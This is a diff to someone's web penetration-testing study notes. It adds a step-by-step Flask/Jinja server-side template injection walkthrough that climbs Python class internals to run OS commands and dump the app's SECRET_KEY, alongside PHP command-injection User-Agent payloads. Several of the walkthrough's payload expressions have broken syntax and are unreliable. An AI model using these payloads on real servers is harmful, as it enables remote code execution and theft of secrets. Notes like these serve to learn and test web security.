@@ -123,7 +123,6 @@ User-Agent: Mozilla <?php system('bin/ls');?>      // cmd injection #2
 User-Agent: Mozilla <?php passthru('bin/ls');?>    // cmd injection #3 
 ```
 
-
 ### ============================================================
 ### Authentication and Session Management
 ### ============================================================
@@ -449,15 +448,46 @@ READ SOME SSTI writeups:
 Flask template injection:  
 ```jinja
 {{4+4}}
-/* Request object gives you request context: {{request.__dict__}} which tells you everything about your request.
+/* Request object:
+ * Gives you request context: {{request.__dict__}} which tells you everything about your request.
  * This is 'server-side disclosure of info' which is a vuln category itself.
  * Can be used to bypass 'http-only' or 'secure-marked' cookies, which can't be disclosed via. Javascript. 
  */
-{{request}}     
+{{request}}  
+
+/* Config object:
+ * Flask-specific config object.
+ * Look for 'SECRET_KEY' which is a key used to encode your Flask cookie.
+ */
 {{config}}
 ```
 
-More Flask/Jinja template injection:
+Flask template injection walkthrough:
+* Use Python method of navigating through classes and objects.
+* Every object has a special method '__class__' letting you access the 'class' object.
+* __mro__ lets you traverse up the class tree, then look down the subclasses.
+
+1. Get a list of the available methods within the Python object:
+   * `''.__class__.__mro__.[1]__dict__`
+   * Construct a string '' and call 'class' on it => get the Python 'str' class itself
+   * Call '__mro__' to get the parent class 'object' i.e. (<class 'str'>, <class 'object'>)
+   * Access index [1] i.e. the 'object' class
+   * See what is in the object itself with __dict__ i.e. a whole bunch of the object's methods.
+
+2. Hunt for a class within the available output list that can be used to exploit:
+   * `[].__class__.__base__.__subclasses()__` => dump all the classes within the Python context.
+   * Copy/Paste output list to sublime.
+   * Replace `,` with `,\n` to see the list of classes + associated index numbers.
+   * Find a suitable class and then access the class by indexing into it: e.g. `<class 'os'>` = index 162
+   
+3. Use the targeted class to exploit the vulnerability:
+   * `[].__class__.__base__.__subclasses__()[162]` to target the OS class (or target `import` class to `import OS`)
+   * Once `OS` class is available, execute system command:
+   * `__init__.__globals['__builtins__']['exec']("import os; os.system('/bin/ls')")}}`
+   * ^or something similar lol fuck this looks so tedious.
+
+
+Other Flask/Jinja template injection stuff:
 ```jinja
 # Dump all used classes
   {{ ''.__class__.__mro__[2].__subclasses__() }}
@@ -563,6 +593,7 @@ Encoding needs to be performed twice as the initial POST request to the target s
 ### ============================================================
 ### Cross-Site Request Forgery
 ### ============================================================
+
 
 
 ### ============================================================
